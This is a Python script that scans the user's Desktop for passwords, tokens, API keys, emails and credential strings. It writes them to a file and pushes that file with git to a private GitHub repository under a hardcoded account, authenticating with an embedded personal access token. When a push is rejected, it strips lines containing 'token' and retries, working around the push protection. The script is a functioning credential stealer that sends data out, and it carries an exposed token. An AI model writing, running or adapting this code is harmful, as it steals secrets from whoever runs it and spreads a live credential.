import os
import subprocess
import re
import requests
import time

# Function to scan the desktop for secrets
def scan_for_secrets():
    secrets = []
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    print(f"Scanning desktop directory: {desktop_path}...")

    # Recursively scan the desktop directory, excluding node_modules
    for root, dirs, files in os.walk(desktop_path):
        # Exclude node_modules directories
        dirs[:] = [d for d in dirs if d != 'node_modules']
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()
                    # Regular expressions to match common secret patterns
                    patterns = [
                        r'(\b\w{8,}-\w{4}-\w{4}-\w{4}-\w{12}\b)',  # UUID
                        r'(\b\w{24}\b)',  # MongoDB connection string
                        r'(\b\w{40}\b)',  # SHA-1 hash
                        r'(\b\w{64}\b)',  # SHA-256 hash
                        r'(\b\w{32}\b)',  # MD5 hash
                        r'(\b\w{16,}\b)',  # Generic long strings (potential API keys)
                        r'(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b)',  # Email addresses
                        r'(\bpassword\b.*?\b\w+\b)',  # Passwords
                        r'(\btoken\b.*?\b\w+\b)',  # Tokens
                        r'(\bsecret\b.*?\b\w+\b)',  # Secrets
                        r'(\bkey\b.*?\b\w+\b)',  # Keys
                        r'(\bapi\b.*?\b\w+\b)',  # API keys
                        r'(\b\w+:\s*\w+\b)',  # Username:Password patterns
                        r'(\b\w+:\s*\w+@\w+\.\w+\b)',  # User:Pass@Host patterns
                    ]
                    for pattern in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            secrets.append(':'.join(match))
                            print(f"Extracted secret from file: {file_path}")
                            print(f"Secret: {':'.join(match)}")
            except (UnicodeDecodeError, IOError) as e:
                print(f"Could not read file {file_path}: {e}")

    return secrets

# Function to check if a repository exists
def repo_exists(github_username, repo_name, token):
    url = f'https://api.github.com/repos/{github_username}/{repo_name}'
    headers = {'Authorization': f'token {token}'}
    response = requests.get(url, headers=headers)
    return response.status_code == 200

# Function to create a new repository
def create_repo(github_username, repo_name, token):
    url = f'https://api.github.com/user/repos'
    headers = {'Authorization': f'token {token}'}
    data = {
        'name': repo_name,
        'private': True  # Create a private repository
    }
    response = requests.post(url, json=data, headers=headers)
    return response.status_code == 201

# Function to push a file to the existing repository
def push_secrets_to_github(secrets, repo_name, token, github_username):
    # Create a new directory for the repo
    repo_path = f'D:\\repos\\{repo_name}'
    os.makedirs(repo_path, exist_ok=True)
    # Create the secrets file
    secrets_file_path = os.path.join(repo_path, 'secrets.txt')
    with open(secrets_file_path, 'w') as f:
        f.write('\n'.join(secrets))
    # Initialize a git repo and push to GitHub
    os.chdir(repo_path)
    try:
        subprocess.run(['git', '--version'], check=True)
        subprocess.run(['git', 'init'], check=True)

        # Check if the remote origin already exists
        result = subprocess.run(['git', 'remote', 'get-url', 'origin'], capture_output=True, text=True)
        if result.returncode != 0:
            subprocess.run(['git', 'remote', 'add', 'origin', f'https://{token}@github.com/{github_username}/{repo_name}.git'], check=True)

        # Set Git email and username temporarily for this script
        subprocess.run(['git', 'config', 'user.email', 'entbanx@outlook.com'], check=True)
        subprocess.run(['git', 'config', 'user.name', 'entbanx'], check=True)

        # Check if there are changes to commit
        result = subprocess.run(['git', 'status', '--porcelain'], capture_output=True, text=True)
        if result.stdout:
            subprocess.run(['git', 'add', '.'], check=True)
            subprocess.run(['git', 'commit', '-m', 'Add secrets'], check=True)
        else:
            print("No changes to commit.")

        # Determine the current branch
        result = subprocess.run(['git', 'branch', '--show-current'], capture_output=True, text=True)
        current_branch = result.stdout.strip()
        print(f"Current branch: {current_branch}")

        # Push to the remote repository
        push_command = ['git', 'push', '-u', 'origin', current_branch]
        print(f"Running push command: {' '.join(push_command)}")
        push_result = subprocess.run(push_command, capture_output=True, text=True)
        if push_result.returncode != 0:
            print(f"Push failed: {push_result.stderr}")
            # Attempt to remove the detected secret and push again
            remove_secret_and_push(secrets_file_path, repo_name, token, github_username, current_branch)
        else:
            print(f"Push successful: {push_result.stdout}")

    except subprocess.CalledProcessError as e:
        print(f"Git operation failed: {e}")

def remove_secret_and_push(secrets_file_path, repo_name, token, github_username, current_branch):
    # Read the secrets file
    with open(secrets_file_path, 'r') as f:
        lines = f.readlines()

    # Remove the detected secret (for example, the first occurrence of a line containing 'token')
    lines = [line for line in lines if 'token' not in line]

    # Write the updated secrets back to the file
    with open(secrets_file_path, 'w') as f:
        f.writelines(lines)

    # Commit and push the changes
    subprocess.run(['git', 'add', secrets_file_path], check=True)
    subprocess.run(['git', 'commit', '-m', 'Remove detected secret from secrets.txt'], check=True)
    push_command = ['git', 'push', '-u', 'origin', current_branch]
    print(f"Running push command after removing secret: {' '.join(push_command)}")
    push_result = subprocess.run(push_command, capture_output=True, text=True)
    if push_result.returncode != 0:
        print(f"Push failed after removing secret: {push_result.stderr}")
    else:
        print(f"Push successful after removing secret: {push_result.stdout}")

# Main function
def main():
    github_username = 'Singularityent'
    github_token = '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'  # Replace with your PAT
    repo_name = 'singularity'

    # Check if the repository already exists
    if repo_exists(github_username, repo_name, github_token):
        # Create a new repository name with a timestamp
        timestamp = int(time.time())
        new_repo_name = f'{repo_name}_{timestamp}'
        repo_name = new_repo_name
        # Create the new repository
        if not create_repo(github_username, repo_name, github_token):
            print(f"Failed to create new repository: {repo_name}")
            return

    secrets = scan_for_secrets()

    if not secrets:
        print("No secrets found.")
        return

    print("Pushing secrets to the existing repository...")
    push_secrets_to_github(secrets, repo_name, github_token, github_username)
    print("Secrets pushed successfully.")

if __name__ == '__main__':
    main()